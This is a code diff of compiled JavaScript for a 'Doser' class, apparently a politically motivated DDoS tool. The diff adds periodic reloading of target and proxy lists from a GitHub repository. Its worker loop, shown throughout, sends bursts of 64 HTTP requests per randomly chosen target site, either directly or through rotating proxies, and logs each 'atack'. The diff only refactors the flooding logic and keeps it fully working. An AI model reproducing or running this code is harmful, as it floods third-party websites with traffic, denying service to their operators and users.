@@ -44,23 +44,32 @@ var axios_https_proxy_fix_1 = __importDefault(require("axios-https-proxy-fix"));
 var events_1 = require("events");
 var Doser = /** @class */ (function () {
     function Doser(onlyProxy, workers) {
+        var _this = this;
         this.hosts = [];
+        this.ATACKS_PER_TARGET = 64;
         this.onlyProxy = onlyProxy;
         this.working = false;
         this.workers = workers;
         this.eventSource = new events_1.EventEmitter();
         this.workerActive = new Array(256);
         this.workerActive.fill(false);
+        //Initialize data
+        this.updateTargetsAndProxies();
+        // Update data repeatedly
+        this.loadingDataInterval = setInterval(function () {
+            _this.updateTargetsAndProxies();
+        }, 300000);
     }
+    Doser.prototype.updateTargetsAndProxies = function () {
+        var _this = this;
+        this.getSitesAndProxyes()
+            .then(function (data) {
+            _this.loadedTargetsAndProxies = data;
+        })
+            .catch(function () { return console.log('Unable to update data'); });
+    };
     Doser.prototype.forceProxy = function (newVal) {
         this.onlyProxy = newVal;
-    };
-    Doser.prototype.loadHostsFile = function () {
-        return __awaiter(this, void 0, void 0, function () {
-            return __generator(this, function (_a) {
-                return [2 /*return*/];
-            });
-        });
     };
     Doser.prototype.getSitesAndProxyes = function () {
         return __awaiter(this, void 0, void 0, function () {
@@ -68,70 +77,27 @@ var Doser = /** @class */ (function () {
             return __generator(this, function (_a) {
                 switch (_a.label) {
                     case 0:
-                        if (!this.working) return [3 /*break*/, 6];
-                        _a.label = 1;
-                    case 1:
-                        _a.trys.push([1, 4, , 5]);
+                        _a.trys.push([0, 3, , 4]);
                         return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })];
-                    case 2:
+                    case 1:
                         sitesResponse = _a.sent();
                         return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })];
-                    case 3:
+                    case 2:
                         proxyResponse = _a.sent();
-                        if (sitesResponse.status !== 200)
-                            return [3 /*break*/, 0];
-                        if (proxyResponse.status !== 200)
-                            return [3 /*break*/, 0];
-                        sites = sitesResponse.data;
-                        proxyes = proxyResponse.data;
-                        return [2 /*return*/, {
-                                sites: sites,
-                                proxyes: proxyes
-                            }];
-                    case 4:
+                        if (sitesResponse.status === 200 && proxyResponse.status === 200) {
+                            sites = sitesResponse.data;
+                            proxyes = proxyResponse.data;
+                            return [2 /*return*/, {
+                                    sites: sites,
+                                    proxyes: proxyes
+                                }];
+                        }
+                        return [3 /*break*/, 4];
+                    case 3:
                         e_1 = _a.sent();
                         console.log('Error while loading hosts');
-                        console.log(e_1);
-                        return [3 /*break*/, 5];
-                    case 5: return [3 /*break*/, 0];
-                    case 6: return [2 /*return*/, null];
-                }
-            });
-        });
-    };
-    Doser.prototype.getRandomTarget = function () {
-        return __awaiter(this, void 0, void 0, function () {
-            var sitesResponse, proxyResponse, sites, proxyes, e_2;
-            return __generator(this, function (_a) {
-                switch (_a.label) {
-                    case 0:
-                        if (!this.working) return [3 /*break*/, 6];
-                        _a.label = 1;
-                    case 1:
-                        _a.trys.push([1, 4, , 5]);
-                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })];
-                    case 2:
-                        sitesResponse = _a.sent();
-                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })];
-                    case 3:
-                        proxyResponse = _a.sent();
-                        if (sitesResponse.status !== 200)
-                            return [3 /*break*/, 0];
-                        if (proxyResponse.status !== 200)
-                            return [3 /*break*/, 0];
-                        sites = sitesResponse.data;
-                        proxyes = proxyResponse.data;
-                        return [2 /*return*/, {
-                                site: sites[Math.floor(Math.random() * sites.length)],
-                                proxy: proxyes
-                            }];
-                    case 4:
-                        e_2 = _a.sent();
-                        console.log('Error while loading hosts');
-                        console.log(e_2);
-                        return [3 /*break*/, 5];
-                    case 5: return [3 /*break*/, 0];
-                    case 6: return [2 /*return*/, null];
+                        return [2 /*return*/, null];
+                    case 4: return [2 /*return*/, null];
                 }
             });
         });
@@ -162,68 +128,59 @@ var Doser = /** @class */ (function () {
     };
     Doser.prototype.worker = function (workerIndex) {
         return __awaiter(this, void 0, void 0, function () {
-            var config, configTimestamp, target, directRequest, response, e_3, ATACKS_PER_TARGET, proxy, atackIndex, r, proxyAddressSplit, proxyIP, proxyPort, proxyAuthSplit, proxyUsername, proxyPassword, r, e_4, code;
+            var config, target, directRequest, response, e_2, proxy, atackIndex, r, proxyAddressSplit, proxyIP, proxyPort, proxyAuthSplit, proxyUsername, proxyPassword, r, e_3, code;
             return __generator(this, function (_a) {
                 switch (_a.label) {
                     case 0: return [4 /*yield*/, this.getSitesAndProxyes()];
                     case 1:
                         config = _a.sent();
-                        configTimestamp = new Date();
                         _a.label = 2;
                     case 2:
-                        if (!this.working) return [3 /*break*/, 20];
+                        if (!this.working) return [3 /*break*/, 18];
                         if (!!this.workerActive[workerIndex]) return [3 /*break*/, 4];
                         return [4 /*yield*/, new Promise(function (resolve) { return setTimeout(resolve, 10000); })];
                     case 3:
                         _a.sent();
                         return [3 /*break*/, 2];
                     case 4:
-                        if (!((new Date()).getTime() - configTimestamp.getTime() > 300000)) return [3 /*break*/, 6];
-                        return [4 /*yield*/, this.getSitesAndProxyes()];
-                    case 5:
-                        config = _a.sent();
-                        configTimestamp = new Date();
-                        _a.label = 6;
-                    case 6:
                         if (config == null) {
-                            return [3 /*break*/, 20];
+                            return [3 /*break*/, 18];
                         }
                         target = {
                             site: config.sites[Math.floor(Math.random() * config.sites.length)],
                             proxy: config.proxyes
                         };
                         directRequest = false;
-                        if (!!this.onlyProxy) return [3 /*break*/, 10];
-                        _a.label = 7;
-                    case 7:
-                        _a.trys.push([7, 9, , 10]);
+                        if (!!this.onlyProxy) return [3 /*break*/, 8];
+                        _a.label = 5;
+                    case 5:
+                        _a.trys.push([5, 7, , 8]);
                         return [4 /*yield*/, axios_https_proxy_fix_1.default.get(target.site.page, { timeout: 10000 })];
-                    case 8:
+                    case 6:
                         response = _a.sent();
                         directRequest = response.status === 200;
-                        return [3 /*break*/, 10];
-                    case 9:
-                        e_3 = _a.sent();
-                        this.eventSource.emit('error', { type: 'error', error: e_3 });
+                        return [3 /*break*/, 8];
+                    case 7:
+                        e_2 = _a.sent();
+                        this.eventSource.emit('error', { type: 'error', error: e_2 });
                         directRequest = false;
-                        return [3 /*break*/, 10];
-                    case 10:
-                        ATACKS_PER_TARGET = 64;
+                        return [3 /*break*/, 8];
+                    case 8:
                         proxy = null;
                         atackIndex = 0;
-                        _a.label = 11;
-                    case 11:
-                        if (!((atackIndex < ATACKS_PER_TARGET) && this.working)) return [3 /*break*/, 19];
-                        _a.label = 12;
-                    case 12:
-                        _a.trys.push([12, 17, , 18]);
-                        if (!directRequest) return [3 /*break*/, 14];
+                        _a.label = 9;
+                    case 9:
+                        if (!((atackIndex < this.ATACKS_PER_TARGET) && this.working)) return [3 /*break*/, 17];
+                        _a.label = 10;
+                    case 10:
+                        _a.trys.push([10, 15, , 16]);
+                        if (!directRequest) return [3 /*break*/, 12];
                         return [4 /*yield*/, axios_https_proxy_fix_1.default.get(target.site.page, { timeout: 5000, validateStatus: function () { return true; } })];
-                    case 13:
+                    case 11:
                         r = _a.sent();
                         this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: "".concat(target.site.page, " | DIRECT | ").concat(r.status) });
-                        return [3 /*break*/, 16];
-                    case 14:
+                        return [3 /*break*/, 14];
+                    case 12:
                         if (proxy === null) {
                             proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)];
                         }
@@ -245,34 +202,34 @@ var Doser = /** @class */ (function () {
                                     }
                                 }
                             })];
-                    case 15:
+                    case 13:
                         r = _a.sent();
                         this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: "".concat(target.site.page, " | PROXY | ").concat(r.status) });
                         if (r.status === 407) {
-                            console.log(proxy);
+                            console.log('Proxy requires auth: ', proxy);
                             proxy = null;
                         }
-                        _a.label = 16;
-                    case 16: return [3 /*break*/, 18];
-                    case 17:
-                        e_4 = _a.sent();
-                        console.log(e_4);
+                        _a.label = 14;
+                    case 14: return [3 /*break*/, 16];
+                    case 15:
+                        e_3 = _a.sent();
+                        console.log('Request error');
                         proxy = null;
-                        code = e_4.code;
+                        code = e_3.code;
                         if (code === undefined) {
-                            console.log(e_4);
+                            console.log('Unknown error: ', e_3);
                             code = 'UNKNOWN';
                         }
                         this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: "".concat(target.site.page, " | ").concat(code) });
                         if (code === 'ECONNABORTED') {
-                            return [3 /*break*/, 19];
+                            return [3 /*break*/, 17];
                         }
-                        return [3 /*break*/, 18];
-                    case 18:
+                        return [3 /*break*/, 16];
+                    case 16:
                         atackIndex++;
-                        return [3 /*break*/, 11];
-                    case 19: return [3 /*break*/, 2];
-                    case 20: return [2 /*return*/];
+                        return [3 /*break*/, 9];
+                    case 17: return [3 /*break*/, 2];
+                    case 18: return [2 /*return*/];
                 }
             });
         });
